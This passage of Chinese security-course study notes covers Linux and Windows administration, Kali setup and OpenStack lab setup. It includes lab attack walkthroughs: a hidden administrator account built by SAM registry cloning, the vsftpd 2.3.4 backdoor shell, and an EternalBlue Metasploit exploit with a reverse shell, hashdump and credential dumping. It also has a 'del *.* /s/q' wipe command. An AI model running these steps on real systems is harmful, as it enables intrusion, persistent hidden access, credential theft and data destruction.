class="hljs bash">net user <span class="hljs-built_in">test</span>$ aa /add <span class="hljs-comment"># 创建一个test$用户</span>net localgroup administrators <span class="hljs-built_in">test</span>$ /add <span class="hljs-comment"># 添加到administrators 组中</span>net user administrator /active:<span class="hljs-built_in">yes</span> <span class="hljs-comment"># 激活administrator账号</span><span class="hljs-comment"># 在本地用户和组中删除test$</span>regedit <span class="hljs-comment"># 打开注册表</span>1、打开HKEY_LOCAL_MACHINE/SAM/SAM，右键“权限”，将administrators组更新完成控制权限，刷新注册表（查看，刷新）；2、继续打开HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Users/Names3、导出administrator的uuid注册表到桌面，Users/000001F4命名为admini_uuid4、导出<span class="hljs-built_in">test</span>$的uuid注册表到桌面，Users/000003E9命名为test_uuid5、导出<span class="hljs-built_in">test</span>$的name注册表到桌面，Users/Names/test$命名为<span class="hljs-built_in">test</span>6、编辑admini_uuid，拷贝F值到test_uuid的导出注册表中7、命令删除<span class="hljs-built_in">test</span>$用户：net user <span class="hljs-built_in">test</span>$ /del，刷新检查注册表和本地用户中都没有<span class="hljs-built_in">test</span>$用户了8、导入<span class="hljs-built_in">test</span>$注册表：先右键<span class="hljs-built_in">test</span>的注册表选择合并，在右键test_uuid的注册表选择合并，刷新检查注册表有<span class="hljs-built_in">test</span>的账号信息了9、设置“不显示登录用户名登录”：gpedit.msc &gt; Windows设置 &gt; 安全设置 &gt; 本地策略 &gt; 安全选项 &gt; <span class="hljs-string">&quot;交互式登录：不显示最后的用户名&quot;</span></code></pre><h3 id="cisp-practise02"><a href="#cisp-practise02" class="headerlink" title="cisp-practise02"></a><a href="https://hjxstart.github.io/2025/08/22/cisp-practice02/">cisp-practise02</a></h3><h3 id="cisp-practise03"><a href="#cisp-practise03" class="headerlink" title="cisp-practise03"></a><a href="https://hjxstart.github.io/2025/08/23/cisp-practice03/">cisp-practise03</a></h3><h2 id="第四天-Linux"><a href="#第四天-Linux" class="headerlink" title="第四天 Linux"></a>第四天 Linux</h2><h3 id="Centos7-安装"><a href="#Centos7-安装" class="headerlink" title="Centos7 安装"></a>Centos7 安装</h3><h3 id="Centos7网络配置"><a href="#Centos7网络配置" class="headerlink" title="Centos7网络配置"></a>Centos7网络配置</h3><pre><code class="hljs bash"></code></pre><h3 id="Centos7-更换Yum源"><a href="#Centos7-更换Yum源" class="headerlink" title="Centos7 更换Yum源"></a>Centos7 更换Yum源</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更换阿里源</span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span class="hljs-comment"># 清理yum缓存</span>yum clean all<span class="hljs-comment"># 重新生成缓存</span>yum makecache</code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="配置Centos7"><a href="#配置Centos7" class="headerlink" title="配置Centos7"></a>配置Centos7</h3><pre><code class="hljs bash"><span class="hljs-comment"># 清屏</span>clear<span class="hljs-comment"># 设置字体</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;setfont LatGrkCyr-12x22&#x27;</span> &gt;&gt; /etc/bashrc<span class="hljs-comment"># 修改源</span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repoyum clean allyum makecache<span class="hljs-comment"># 安装工具</span>yum install wget -y <span class="hljs-comment"># wget下载</span>yum install -y net-tools  <span class="hljs-comment"># ifconfig</span>yum install -y bind-utils <span class="hljs-comment"># nslookup</span>yum install -y vim-enhanced <span class="hljs-comment"># vim</span>yum install -y tree <span class="hljs-comment"># tree --help | more 翻页</span><span class="hljs-comment"># 防火墙命令</span>systemctl stop firewalld <span class="hljs-comment"># 查看防火墙状态</span>systemctl <span class="hljs-built_in">disable</span> firewalld <span class="hljs-comment"># 禁止开机自启动</span>systemctl status firewalld <span class="hljs-comment"># 查看防火墙状态</span><span class="hljs-comment"># 关闭selinux</span><span class="hljs-built_in">cp</span> /etc/selinux/config /etc/selinux/config.bak <span class="hljs-comment"># 备份selinux备份</span>vim /etc/selinux/config <span class="hljs-comment"># 将 enforcing 修改为 disabled </span>getenforce <span class="hljs-comment"># 检查 selinux是否是 disabled 状态</span><span class="hljs-comment"># tree命令</span>tree / -L 1<span class="hljs-comment"># file</span>file 命令可以判断文件类型<span class="hljs-comment"># ls命令</span><span class="hljs-built_in">ls</span> -i <span class="hljs-comment"># index 索引</span><span class="hljs-built_in">ls</span> -alh</code></pre><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><pre><code class="hljs axapta">bin <span class="hljs-meta"># 二进制</span>boot <span class="hljs-meta"># 启动，内核</span>dev <span class="hljs-meta"># 设备</span>etc <span class="hljs-meta"># 配置文件</span>home <span class="hljs-meta"># 其他用户家目录</span>lib <span class="hljs-meta"># 系统库 链接文件</span>mnt <span class="hljs-meta"># 挂载</span>opt <span class="hljs-meta"># 大的安装</span>root <span class="hljs-meta"># root用户家目录</span><span class="hljs-built_in">var</span> <span class="hljs-meta"># 网页</span>tmp <span class="hljs-meta"># 临时文件</span>sys <span class="hljs-meta"># 文件系统</span>srv <span class="hljs-meta">#</span>复制代码</code></pre><h3 id="Linux文件类型–file"><a href="#Linux文件类型–file" class="headerlink" title="Linux文件类型–file"></a>Linux文件类型–file</h3><pre><code class="hljs bash">text 文件shell script <span class="hljs-comment"># shell 脚本 </span>executable <span class="hljs-comment"># 可执行</span>data <span class="hljs-comment"># 数据</span>directory <span class="hljs-comment"># 目录</span>empty <span class="hljs-comment"># 空</span>复制代码<span class="hljs-comment"># 文件</span><span class="hljs-built_in">touch</span> aa.txt <span class="hljs-comment"># 创建文件</span><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; aa.txt <span class="hljs-comment"># 查看文件</span>file aa.txt <span class="hljs-comment"># text</span><span class="hljs-comment"># 目录</span><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span> <span class="hljs-comment"># 创建test目录</span><span class="hljs-built_in">mkdir</span> -p a/b/c <span class="hljs-comment"># 创建多层级目录</span><span class="hljs-built_in">rm</span> -r <span class="hljs-built_in">test</span> <span class="hljs-comment"># 删除test目录</span><span class="hljs-built_in">rm</span> -rf a <span class="hljs-comment"># 删除a目录，不用回复yes</span><span class="hljs-built_in">mv</span> a <span class="hljs-built_in">test</span> <span class="hljs-comment"># 将a目录移动到test下</span><span class="hljs-built_in">mv</span> <span class="hljs-built_in">test</span>/a /root/b <span class="hljs-comment"># 将test目录下的a，移动到/root下，并改名称为b</span>Ctrl + D <span class="hljs-comment"># 输入结束</span>Ctrl + S <span class="hljs-comment"># 暂停屏幕输出</span>Ctrl + U <span class="hljs-comment"># 在提示符下，将整行命令删除</span>Ctrl + Z <span class="hljs-comment"># 暂停当前任务</span>复制代码</code></pre><h3 id="文件压缩和备份"><a href="#文件压缩和备份" class="headerlink" title="文件压缩和备份"></a>文件压缩和备份</h3><pre><code class="hljs bash"><span class="hljs-comment">## bzip2 命令：用于创建和管理（包括解压缩）&quot;.bz2&quot;格式的压缩包</span><span class="hljs-comment"># bzip2 [选项] [要压缩的文件]</span><span class="hljs-comment"># .bz2 文件的压缩程序，并删除原始的文件</span><span class="hljs-comment"># 压缩</span>bzip2 aa.txt <span class="hljs-comment"># 不保留原文件，生成aa.txt.bz2 压缩文件</span>bzip2 -k bb.txt <span class="hljs-comment"># 保留原文件，生成bb.txt.bz2 压缩文件</span><span class="hljs-comment"># 解压</span>bzip2 -d aa.txt.bz2 <span class="hljs-comment"># 解压文件，不保留压缩包</span>bzip2 -tv bb.txt.bz2 <span class="hljs-comment"># 测试完整性，没有返回就没有问题，可选：v是可视化，f是强制替换现有的文件</span><span class="hljs-comment">## gzip</span><span class="hljs-comment"># 压缩</span>gzip aa.txt bb.txt <span class="hljs-comment"># 分别压缩aa.txt.gz, bb.txt.gz，原文件不保留</span>gzip -l bb.txt.gz <span class="hljs-comment"># 列出压缩包内容</span>gzip -c cc.txt <span class="hljs-comment"># 标准输出（取巧）</span>gzip -r <span class="hljs-built_in">test</span> <span class="hljs-comment"># 递归，st目录下的文件分别压缩，可以使用drv，递归解压</span><span class="hljs-comment"># 解压</span>gzip -d bb.txt.gz <span class="hljs-comment"># 解压缩文件，可选：f强制解压，v是可视化</span><span class="hljs-comment">## tar 打包（备份作用），f 文件是必备参数(该参数要放在最后)，(可以打包目录)</span><span class="hljs-comment"># 打包</span>tar -cf txt.tar *.txt <span class="hljs-comment"># c是创建，txt.tar打包后的文件名，*.txt是要打包的文件</span>tar -tf txt.tar <span class="hljs-comment"># t是查看压缩包里面的内容</span><span class="hljs-comment"># 解包</span>tar -xf txt.tar <span class="hljs-comment"># 保留压缩包，解压到当前路径</span><span class="hljs-comment"># 压缩(z=gz, j=bz2)</span>tar -czf txt.tar.gz *.txttar -cjf txt.tar.bz2 *.txt<span class="hljs-comment"># 解压</span>tar -xzf txt.tar.gztar -xjf txt.tar.bz2 </code></pre><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># which [] 命令 ： 查看命令的环境变量</span><span class="hljs-comment"># uname 显示 linux 体系结构和内核版本</span><span class="hljs-built_in">uname</span> <span class="hljs-comment"># linux</span><span class="hljs-built_in">uname</span> -a <span class="hljs-comment"># 查看所有信息</span><span class="hljs-built_in">uname</span> -m <span class="hljs-comment"># 显示电脑类型 x86_64</span><span class="hljs-built_in">uname</span> -n <span class="hljs-comment"># 主机名称</span><span class="hljs-built_in">uname</span> -r <span class="hljs-comment"># 发行编号，不是版本号</span><span class="hljs-built_in">uname</span> -v <span class="hljs-comment"># 版本号</span><span class="hljs-built_in">uname</span> -s <span class="hljs-comment"># 操作系统名称</span><span class="hljs-built_in">uname</span> -p <span class="hljs-comment"># 处理器 x86_64</span><span class="hljs-built_in">uname</span> -i <span class="hljs-comment"># 硬件平台 x86_64</span><span class="hljs-built_in">uname</span> -io <span class="hljs-comment"># 操作系统名称</span><span class="hljs-comment"># service 命令，旧版本的systemctl (更强大)</span>service [start|stop|restatus|reload|status] service_name<span class="hljs-comment"># systemctl service_name [start|stop|restatus|reload|status]</span>systemctl show firewalldsystemctl mask firewalld <span class="hljs-comment"># 注销（无法通过命令启动，可以需要unmask找回来启动）</span><span class="hljs-comment"># 服务状态</span>static : 不可以自己启动，需要enabled服务来唤醒mask : 注销，无法启动，可以通过systemctl unmask 恢复原来的状态active (exited) : 仅执行一次就正常结束的服务active (waiting) : 正在执行当中，不过还再等待其他的时间才能继续处理。例如打印机相关服务的状态<span class="hljs-comment"># cut 命令，剪</span><span class="hljs-comment"># 文件aa.txt文件如下, 分隔符可以是空格，逗号等</span>123456<span class="hljs-comment"># cut -d &#x27;&#x27; -f 1 aa.txt</span>14<span class="hljs-comment"># cut -d &#x27;&#x27; -f 1-2 aa.txt</span>1245<span class="hljs-built_in">cut</span> -d : -f 1,3 /etc/passwd <span class="hljs-comment"># 只显示第1,3列</span><span class="hljs-comment"># 标准输入，输入重定向</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;hello word \nhello kylin&quot;</span> &gt; aa<span class="hljs-built_in">wc</span> -l &lt; aa.txt &gt; bb.txt<span class="hljs-built_in">cat</span> bb.tt <span class="hljs-comment"># 2</span><span class="hljs-comment"># 多命令执行方式。可以；&amp;&amp; || 之间混合使用</span>command1;command2;command3 <span class="hljs-comment"># 顺序执行，命令错误也会执行后面</span>command1&amp;&amp;command2&amp;&amp;command3 <span class="hljs-comment"># 顺序执行，前面有错误后面不会执行</span>command1 || command2 || command3 <span class="hljs-comment"># 命令1错执行命令2，命令2错执行命令3，命令1正确后面不执行</span>command1 | command2 | command3 <span class="hljs-comment">#  管道符作用，只显示最后一个命令结果</span><span class="hljs-comment"># 痕迹命令</span>w <span class="hljs-comment"># tty实时登录信息 , tty命令查看当前tty编号，Logname查看原始登录的用户（切换用户的情况）</span><span class="hljs-built_in">who</span> <span class="hljs-comment"># 和w差不多，更简洁</span>last <span class="hljs-comment"># 最近登录信息，显示远程登录ip</span>lastlog <span class="hljs-comment"># 最后登录时间</span>lastb <span class="hljs-comment"># 查看最近登录失败的信息（密码错误，或者账号错误）</span></code></pre><h3 id="VIM-编辑工具"><a href="#VIM-编辑工具" class="headerlink" title="VIM 编辑工具"></a>VIM 编辑工具</h3><pre><code class="hljs bash">命令模式:<span class="hljs-built_in">dd</span> 剪切      <span class="hljs-built_in">dd</span> + p  剪切后粘贴yy 复制  yy + 3p 复制后粘贴3行u  撤销ctl+r 恢复撤销末行模式:wq 保存wq! 强制保存q 退出q! 强制退出/字符串  查找改字符串/^字符查找以改字符为开头的/字符$查找以改字符为结尾的<span class="hljs-built_in">set</span> nu 显示行号<span class="hljs-built_in">set</span> nonu 取消行号</code></pre><h3 id="文件权限-用户"><a href="#文件权限-用户" class="headerlink" title="文件权限&amp;用户"></a>文件权限&amp;用户</h3><pre><code class="hljs bash">目录：755文件：644<span class="hljs-built_in">chmod</span> 755 <span class="hljs-built_in">dir</span><span class="hljs-built_in">chmod</span> 655 file<span class="hljs-built_in">chown</span> user:group <span class="hljs-built_in">test</span><span class="hljs-comment"># 特殊权限</span><span class="hljs-built_in">sudo</span> 借用root权限SUID: 借用User的权限，只在文件SGID: 借用group的权限，<span class="hljs-built_in">id</span> username <span class="hljs-comment"># 查看uid</span><span class="hljs-comment"># 创建用户</span>useradd mzpasswd aasu mzsuuserdel -rf mz <span class="hljs-comment"># 删除用户和文件</span>groupadd group_1groupdel -f group_1<span class="hljs-comment"># 添加到用户到组，或者删除</span>gpasswd -a user groupgpsswd -d user group<span class="hljs-comment"># /etc/sudoers 添加用户才可以sudo提权</span>root ALL=(ALL) ALL<span class="hljs-comment"># /etc/sudoers.d/下添加也可以</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;user ALL=(ALL) ALL&quot;</span> &gt; user_sudoers<span class="hljs-comment"># 实例</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;while true ; do echo -e &quot;\a&quot; ; sleep 1 ; done&#x27;</span>  &gt;aa 将脚本写入 aa 文件./aa<span class="hljs-built_in">chmod</span> 744 aa ======= 修改成可执行文件./aa ======= 执行 aa文件，语法为 ./[文件名]</code></pre><h3 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># top 命令的交互选项：</span>P按键  <span class="hljs-comment">#根据CPU使用率从大到小排序</span>M按键  <span class="hljs-comment">#根据内存使用率从大到小排序</span>N按键  <span class="hljs-comment">#根据PIN从大到小排序</span>T按键  <span class="hljs-comment">#根据进程使用CPU累计运算的时间排序</span>q按键  <span class="hljs-comment">#退出top </span>ps aux  <span class="hljs-comment"># 显示用户，tty，命令</span>ps -ef <span class="hljs-comment"># pid</span>top <span class="hljs-comment"># 动态查看，3s查看一次</span></code></pre><h3 id="cisp-practise04"><a href="#cisp-practise04" class="headerlink" title="cisp-practise04"></a><a href="https://hjxstart.github.io/2025/08/26/cisp-practice04/">cisp-practise04</a></h3><h2 id="第五天-Kali-网络-rpm包管理工具"><a href="#第五天-Kali-网络-rpm包管理工具" class="headerlink" title="第五天 Kali 网络&amp;rpm包管理工具"></a>第五天 Kali 网络&amp;rpm包管理工具</h2><h3 id="安装和配置Kali"><a href="#安装和配置Kali" class="headerlink" title="安装和配置Kali"></a>安装和配置Kali</h3><pre><code class="hljs bash">wget -qO- https://archive.kali.org/archive-key.asc | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://archive.kali.org/kali kali-rolling main non-free contrib&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list</code></pre><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># ifconfig</span>ifconfig -s <span class="hljs-comment"># 查询网卡网络通信情况</span>ifconfig ens33 down <span class="hljs-comment"># 关闭网卡，网卡不在，IP也不见了</span>ifconfig ens33 up <span class="hljs-comment"># 开启网卡</span>ifdown ens33 <span class="hljs-comment"># 关闭网卡，网卡还在，IP不见了</span>ifup ens33 <span class="hljs-comment"># 启动网卡</span><span class="hljs-comment"># ip</span>ip addr <span class="hljs-comment"># 查看IP地址</span>ip addr add 192.168.16.101/24 dev ens33 <span class="hljs-comment"># 临时添加IP地址，用于测试，重启就没有了</span>ip <span class="hljs-built_in">link</span> <span class="hljs-comment"># 查看当前设备情况</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 down <span class="hljs-comment"># 关闭网卡，网卡不在，</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 up <span class="hljs-comment"># 开启网卡</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 name ens32 <span class="hljs-comment"># 关闭网卡后，可以修改网卡名称，之后再启动</span>ip route show <span class="hljs-comment"># 查看路由信息</span><span class="hljs-comment"># route</span>route <span class="hljs-comment"># 显示路由 (default)</span>route -n <span class="hljs-comment"># -n是以数字的方式显示 (0.0.0.0)</span><span class="hljs-comment"># netstat 查看网络连接</span>netstat -anpt <span class="hljs-comment"># 显示当前主机所有互动的,TCP协议</span>netstat -anpu <span class="hljs-comment"># 显示 UDP协议</span>netstat -lanpt <span class="hljs-comment"># 监听</span><span class="hljs-comment"># ss 查看网络连接2，高并发的场景</span>ss -anpt <span class="hljs-comment"># 和netstat差不多</span><span class="hljs-comment"># nslookup # </span>nslookup www.baidu.com <span class="hljs-comment"># 返回域名对应的IP地址</span><span class="hljs-comment"># ping</span>ping -c 5 www.baidu.comn <span class="hljs-comment"># 指定ping 次数</span>ping -s 1000 www.baidu.com <span class="hljs-comment"># 指定包大小</span><span class="hljs-comment"># tracert # 跟踪</span>yum install -y traceroutetraceroute www.wangdun.cn<span class="hljs-comment"># 网卡配置目录</span>/etc/sysconfig/network-scripts/<span class="hljs-built_in">cp</span> ifcfg-ens33 ifcfg-ens33.bak <span class="hljs-comment"># 备份网卡</span><span class="hljs-comment"># vim ifcfg-ens33</span>TYPE=<span class="hljs-string">&quot;Ethernet&quot;</span> <span class="hljs-comment"># 以太网</span>PROXY_METHOD=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-comment"># 代理方法：关闭</span>BROWSER_ONLY=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-comment"># 仅仅是浏览器</span>BOOTPROTO=<span class="hljs-string">&quot;dhcp&quot;</span> <span class="hljs-comment"># 网卡协议</span>DEFROUTE=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-comment"># 默认路由</span>IPV4_FAILURE_FATAL=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-comment"># </span>IPV6INIT=<span class="hljs-string">&quot;yes&quot;</span>IPV6_AUTOCONF=<span class="hljs-string">&quot;yes&quot;</span>IPV6_DEFROUTE=<span class="hljs-string">&quot;yes&quot;</span>IPV6_FAILURE_FATAL=<span class="hljs-string">&quot;no&quot;</span>IPV6_ADDR_GEN_MODE=<span class="hljs-string">&quot;stable-privacy&quot;</span>NAME=<span class="hljs-string">&quot;ens33&quot;</span> <span class="hljs-comment"># 网卡名称</span>UUID=<span class="hljs-string">&quot;5b505e8a-35f2-4920-8241-edd9f3070780&quot;</span> <span class="hljs-comment"># 唯一标识码</span>DEVICE=<span class="hljs-string">&quot;ens33&quot;</span> <span class="hljs-comment"># 设备名称</span>ONBOOT=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-comment"># 是否激活</span><span class="hljs-comment"># 静态新加（DNS最多3个）</span>IPADDR=<span class="hljs-string">&quot;192.168.16.101&quot;</span>NETMASK=<span class="hljs-string">&quot;255.255.255.0&quot;</span>GATEWAY=<span class="hljs-string">&quot;192.168.16.2&quot;</span>DNS1=<span class="hljs-string">&quot;223.5.5.5&quot;</span> <span class="hljs-comment"># 阿里</span>DNS2=<span class="hljs-string">&quot;8.8.8.8&quot;</span> <span class="hljs-comment"># 谷歌</span>DNS3=<span class="hljs-string">&quot;192.168.16.2&quot;</span><span class="hljs-comment"># cat /etc/resolv.conf</span><span class="hljs-comment"># Generated by NetworkManager</span>nameserver 223.5.5.5nameserver 8.8.8.8nameserver 192.168.16.2<span class="hljs-comment"># df</span><span class="hljs-built_in">df</span> -h <span class="hljs-comment"># 查看系统空间</span>free -h <span class="hljs-comment"># 内存空闲</span><span class="hljs-built_in">cat</span> /proc/cpuinfo <span class="hljs-comment"># 查看CPU信息</span><span class="hljs-comment"># rpm</span><span class="hljs-comment"># http://rpmfind.net/</span>rpm -aq <span class="hljs-comment"># 查询系统已安装的包</span>rpm -ivh <span class="hljs-comment"># i:安装；v：可视化；h:进度</span>rpm -ql <span class="hljs-comment"># 查看软件是否安装</span>-i <span class="hljs-comment"># 安装</span>-e <span class="hljs-comment"># 卸载</span><span class="hljs-comment"># yum</span>yum repolist <span class="hljs-comment"># 查看镜像源</span>yum search vsftpd <span class="hljs-comment"># 查看vsftpd软件包</span>yum install vsftpd <span class="hljs-comment"># 安装vsftpd软件</span>yum remove vsftpd <span class="hljs-comment"># 卸载vsftpd软件</span>yum autoremove <span class="hljs-comment"># 卸载残留</span>yum clear all<span class="hljs-comment">## vsftpd</span><span class="hljs-comment"># http://rpmfind.net/</span>wget https://rpmfind.net/linux/mageia/distrib/8/x86_64/media/core/release/vsftpd-3.0.3-11.mga8.x86_64.rpm<span class="hljs-comment"># /etc/vsftpd/vsftpd.conf</span>anonymous_enable=NOchroot_local_user=YESchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listlisten=YESlisten_ipv6=NO<span class="hljs-comment"># </span>useradd ftpuserpasswd ftpuservim  /etc/vsftpd/user_list <span class="hljs-comment"># 添加ftpuser</span><span class="hljs-comment"># systemctl restart vsftpd</span>netstat -anpt  <span class="hljs-comment"># 查看21端口</span><span class="hljs-comment"># 客户端</span>yum install ftpsftp ftpuser@192.168.16.101get filename <span class="hljs-comment"># 下载</span>put filename <span class="hljs-comment"># 上传</span></code></pre><h3 id="笑脸漏洞，2-3及以下版本"><a href="#笑脸漏洞，2-3及以下版本" class="headerlink" title="笑脸漏洞，2.3及以下版本"></a>笑脸漏洞，2.3及以下版本</h3><pre><code class="hljs bash"><span class="hljs-comment"># 探活</span>nmap 192.168.16.0/24 <span class="hljs-comment"># 可以查看到ftp</span>nmap -sV 192.168.16.ip <span class="hljs-comment"># 查看服务版本</span><span class="hljs-comment"># nc 瑞士小军刀</span>nc 192.168.16.ip 21 <span class="hljs-comment"># ftp21端口,用户和密码随便输入, :)是关键</span>user aa:) pass aaaa<span class="hljs-comment"># 同时开其他终端</span><span class="hljs-built_in">sudo</span> nmap -sS -p 6200 192.168.16.ip <span class="hljs-comment"># 6200端口</span>nc 192.168.16.ip 6200 <span class="hljs-comment">#已经进去了</span><span class="hljs-built_in">ls</span>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>&lt;img src=<span class="hljs-string">&quot;http://img.k2r2.com/uploads/002/20230625/1618252013.jpg&quot;</span>&gt;</code></pre><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h3 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h3><pre><code class="hljs bash"><span class="hljs-comment"># 删除C盘的全部文件</span>del *.* /s/q</code></pre><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h3><pre><code class="hljs bash"><span class="hljs-comment"># 设置中文</span><span class="hljs-built_in">sudo</span> dpkg-reconfigure locales<span class="hljs-comment"># 修改root密码</span><span class="hljs-built_in">sudo</span> -ipassword root<span class="hljs-comment">## root用户视图下，更换kali源仓库为国内</span><span class="hljs-built_in">cd</span> /etc/apt<span class="hljs-built_in">cp</span> sources.list sources.list.bak<span class="hljs-comment"># 阿里源</span>deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="hljs-comment"># apt更新</span>apt update <span class="hljs-comment"># 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5</span><span class="hljs-comment">## 实用工具</span><span class="hljs-comment"># 检测主机是否存在</span>fping -asg 192.168.112.0/24 -C 1<span class="hljs-comment">## nmap  网络探测和安全审核</span><span class="hljs-comment"># nmap 192.168.112.128</span>135/tcp   open  msrpc <span class="hljs-comment"># RPC远程调用</span>139/tcp   open  netbios-ssn <span class="hljs-comment"># 文件共享</span>445/tcp   open  microsoft-ds <span class="hljs-comment"># 永恒之蓝</span>3389/tcp  open  ms-wbt-server <span class="hljs-comment"># 远程桌面端口</span>5357/tcp  open  wsdapi <span class="hljs-comment"># 非常高危的端口</span>49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49156/tcp open  unknown49157/tcp open  unknown<span class="hljs-comment"># nmap -sV 192.168.112.128</span><span class="hljs-comment"># nmap -p 1-65535 192.168.112.128</span><span class="hljs-comment"># nmap -p- 192.168.112.128</span></code></pre><h3 id="永恒之蓝-MS17-010"><a href="#永恒之蓝-MS17-010" class="headerlink" title="永恒之蓝 MS17-010"></a>永恒之蓝 MS17-010</h3><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sS -p 445 192.168.112.0/24 &gt; p_445<span class="hljs-built_in">cat</span> p_445 | grep -E <span class="hljs-string">&quot;Nmap|open&quot;</span><span class="hljs-comment"># </span>msfconsole  search ms17_010  use auxiliary/scanner/smb/smb_ms17_010  use exploit/windows/smb/ms17_010_eternalblue\    <span class="hljs-built_in">set</span> rhost 192.168.112.128 <span class="hljs-comment"># 设置靶机</span>    <span class="hljs-built_in">set</span> lhost 192.168.112.130 <span class="hljs-comment"># 设置本机IP</span>    <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    run <span class="hljs-comment"># 开始攻击</span><span class="hljs-comment">## 攻击成功后的操作</span>screenshot <span class="hljs-comment"># 截图</span>screenshare <span class="hljs-comment"># 实时监控屏幕</span><span class="hljs-comment"># 查看密码</span>hashdumpload kiwips -S <span class="hljs-string">&quot;csrss&quot;</span>migrate 344creds_allshell <span class="hljs-comment"># 登陆到win7</span>chcp 65001 <span class="hljs-comment"># 消除乱码</span>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1 <span class="hljs-comment"># 远程</span>netstat -an <span class="hljs-comment"># 查看端口</span><span class="hljs-built_in">sudo</span> rdesktop 192.168.112.128 <span class="hljs-comment"># 发起远程</span></code></pre><h3 id="SQL注入–CVE-2022-32991漏洞复现"><a href="#SQL注入–CVE-2022-32991漏洞复现" class="headerlink" title="SQL注入–CVE-2022-32991漏洞复现"></a>SQL注入–CVE-2022-32991漏洞复现</h3><pre><code class="hljs bash"></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack</title>
      <link href="/2025/04/24/OpenStack/"/>
      <url>/2025/04/24/OpenStack/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code class="hljs bash">RHOPS13（红帽-商业版 V13）内容：Openstack的运维（基于原生的Q版）环境：配套环境的文件夹 -&gt; RHSOP13 -&gt; RHOSP13.wmx硬件：内存32G以上，开启CPU虚拟化网络：仅主机，172.25.254.0/24,关闭DHCP打开虚拟机: 选择我已经复制虚拟机账号信息: kiosk/redhat  root/Asimov切换到root设置时间: su - root    <span class="hljs-built_in">date</span> -s <span class="hljs-string">&quot;20220909 11:01&quot;</span> <span class="hljs-comment"># 设置2022年1月以后</span>    hwclock -w环境调整：(关机后调整)    controller/director: 调整为CPU 6C,内存12G（12288）    utility: 6C/6G (6144)    验证环境：ssh student@workstation后        ssh director        <span class="hljs-built_in">source</span> overcloudrc        openstack service list环境初始化：    virt-manager <span class="hljs-comment"># 查看虚拟机</span>    rht-f0finish <span class="hljs-comment"># 启动环境</span>常用命令:     rht-vmctl restart all -y <span class="hljs-comment"># 开启所有</span>    rht-vmctl fullreset all -y <span class="hljs-comment"># 完整恢复</span>    rht-vmctl reset 节点名称    其他：如果无法启动就手动启动关闭OpenStack课堂环境集群    生产环境：不需要关闭    课堂环境：不使用后要关闭，因为不关闭内存里面会产生脏数据，影响后面学习使用    步骤1: 停止OpenStack平台中所有的虚拟机(关机)    步骤2: 到director运行脚本做各个物流节点的下单处理: ssh director    步骤3：切换到student/student: ssh student@workstation    步骤4:：rht-overcloud.sh start</code></pre><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250424093017420.png" alt="课堂环境"></p><p>课堂环境</p><pre><code class="hljs bash">Undercloud(云下环境): director: 存储OpenStack中各种组件的应用程序，便于节点安装（All <span class="hljs-keyword">in</span> One）Overcloud(云上环境): 实际作用:模拟生产环境节点    controller: 控制节点，安装有各种API，网络的组件，身份验证API，Keystone等    compute: 计算节点（一般不止一个）：做虚拟机迁移，资源不够网其他节点去迁移等    computehci：超融合节点，    ceph: 